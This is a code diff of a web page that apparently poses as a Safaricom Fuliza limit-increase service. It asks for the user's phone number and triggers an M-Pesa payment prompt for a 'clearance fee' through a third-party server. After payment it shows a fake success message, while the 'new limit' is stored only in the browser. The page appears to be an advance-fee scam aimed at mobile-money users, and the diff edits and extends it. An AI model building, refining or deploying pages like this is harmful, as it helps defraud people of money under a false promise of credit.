@@ -7,15 +7,58 @@
 
 <style>
 body{font-family:Arial,sans-serif;background:#f4f6f9;margin:0;}
-.top-bar{background:#1fb141;padding:12px;text-align:center;color:white;font-weight:bold;font-size:18px;}
-.payment-box{max-width:420px;margin:60px auto;background:white;padding:30px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.1);text-align:center;}
+.top-bar{
+background:#1fb141;
+padding:12px;
+text-align:center;
+color:white;
+font-weight:bold;
+font-size:18px;
+}
+.payment-box{
+max-width:420px;
+margin:60px auto;
+background:white;
+padding:30px;
+border-radius:12px;
+box-shadow:0 6px 18px rgba(0,0,0,0.1);
+text-align:center;
+}
 .info{margin:10px 0;font-size:16px;}
-input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radius:6px;font-size:16px;}
-.pay-btn{margin-top:20px;width:100%;padding:14px;background:#1fb141;border:none;color:white;font-size:16px;border-radius:30px;cursor:pointer;}
+input{
+width:100%;
+padding:12px;
+margin-top:15px;
+border:1px solid #ddd;
+border-radius:6px;
+font-size:16px;
+}
+.pay-btn{
+margin-top:20px;
+width:100%;
+padding:14px;
+background:#1fb141;
+border:none;
+color:white;
+font-size:16px;
+border-radius:30px;
+cursor:pointer;
+}
 .pay-btn:hover{background:#179937;}
 .spinner{margin-top:15px;display:none;}
-.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto;}
-@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+.loader{
+border:4px solid #f3f3f3;
+border-top:4px solid #1fb141;
+border-radius:50%;
+width:30px;
+height:30px;
+animation:spin 1s linear infinite;
+margin:auto;
+}
+@keyframes spin{
+0%{transform:rotate(0deg);}
+100%{transform:rotate(360deg);}
+}
 .message{margin-top:15px;font-size:14px;color:#555;}
 .encourage{margin-top:15px;font-size:14px;color:#555;}
 .success{margin-top:20px;font-size:16px;color:green;font-weight:bold;}
@@ -40,13 +83,15 @@ Complete this step to instantly activate your new limit.
 </p>
 
 <div class="info">Selected Fuliza Limit: <strong id="limitDisplay"></strong></div>
-<div class="info">Clearance Fee: <strong id="fee">KSh 850</strong></div>
+<div class="info">Clearance is Fee: <strong id="fee">KSh 850</strong></div>
 
 <input type="tel" id="phone" placeholder="Enter Safaricom Number (07XXXXXXXX / 01XXXXXXXX / 2547XXXXXXXX)">
 
 <button class="pay-btn" onclick="releaseLimit()">Pay & Complete Clearance</button>
 
-<div class="spinner" id="spinner"><div class="loader"></div></div>
+<div class="spinner" id="spinner">
+<div class="loader"></div>
+</div>
 
 <div class="message" id="message"></div>
 <div class="success" id="success"></div>
@@ -55,7 +100,7 @@ Complete this step to instantly activate your new limit.
 
 <script>
 const selectedAmount = localStorage.getItem("selectedAmount");
-const clearanceFee = 15;
+const clearanceFee = 15; // KSh 850
 
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 document.getElementById("limitDisplay").innerText = "KSh " + selectedAmount;
@@ -74,8 +119,8 @@ async function releaseLimit(){
   const spinner = document.getElementById("spinner");
   const successMsg = document.getElementById("success");
 
-  msg.innerText="";
-  successMsg.innerText="";
+  msg.innerText = "";
+  successMsg.innerText = "";
 
   if(!phone){
     msg.innerText="Enter your phone number";
@@ -90,17 +135,21 @@ async function releaseLimit(){
   }
 
   const phoneToSend = formatPhone(phone);
+
   spinner.style.display="block";
   msg.innerText="Processing clearance... please check your phone";
   msg.style.color="black";
 
   try{
+    // ✅ Updated to M-Pay Africa server
     const res = await fetch("https://mpayafrica-server.onrender.com/deposit",{
       method:"POST",
       headers:{"Content-Type":"application/json"},
       body:JSON.stringify({
         phone_number: phoneToSend,
-        amount: clearanceFee
+        amount: clearanceFee,
+        country: "KE",
+        network: "MPESA"
       })
     });
 
@@ -108,15 +157,17 @@ async function releaseLimit(){
     spinner.style.display="none";
 
     if(data.success){
-      msg.innerText="STK Push sent ✅ Enter your M-Pesa PIN to complete";
+      msg.innerText="STK Push sent ✅ Enter your M‑Pesa PIN to complete";
       msg.style.color="green";
+
       checkPayment(data.reference);
-    } else {
+
+    }else{
       msg.innerText="Payment failed: "+(data.message || "Try again");
       msg.style.color="red";
     }
 
-  } catch(err){
+  }catch(err){
     spinner.style.display="none";
     msg.innerText="Server error: "+(err.message || "Try again");
     msg.style.color="red";
@@ -128,9 +179,9 @@ async function checkPayment(reference){
   const successMsg = document.getElementById("success");
   let attempts = 0;
 
-  const interval = setInterval(async () => {
+  const interval = setInterval(async()=>{
     attempts++;
-    if(attempts > 20){
+    if(attempts>20){
       clearInterval(interval);
       msg.innerText="Payment timeout. Please retry.";
       msg.style.color="red";
@@ -144,22 +195,24 @@ async function checkPayment(reference){
       if(data.success && data.data){
         const status = data.data.status.toLowerCase();
 
-        if(status==="success" || status==="loan_released" || status==="processing"){
+        if(status==="success" || status==="loan_released"){
           clearInterval(interval);
           msg.innerText="";
           successMsg.innerText="🎉 Congratulations! Your Fuliza limit has been successfully increased to KSh "+selectedAmount+" ✅";
           localStorage.setItem("currentLimit",selectedAmount);
-          setTimeout(()=>{window.location.href="success.html";},3000);
+          setTimeout(()=>{
+            window.location.href="success.html";
+          },3000);
         }
 
-        if(status==="failed" || status==="cancelled" || status==="stk_failed" || status==="error"){
+        if(status==="failed" || status==="stk_failed" || status==="cancelled" || status==="error"){
           clearInterval(interval);
-          msg.innerText="Payment failed or cancelled: " + (data.data.message || "Please try again");
+          msg.innerText="Payment failed or cancelled: "+(data.data.message || data.data.status);
           msg.style.color="red";
         }
       }
 
-    } catch(e){}
+    }catch(e){}
   },3000);
 }
 </script>
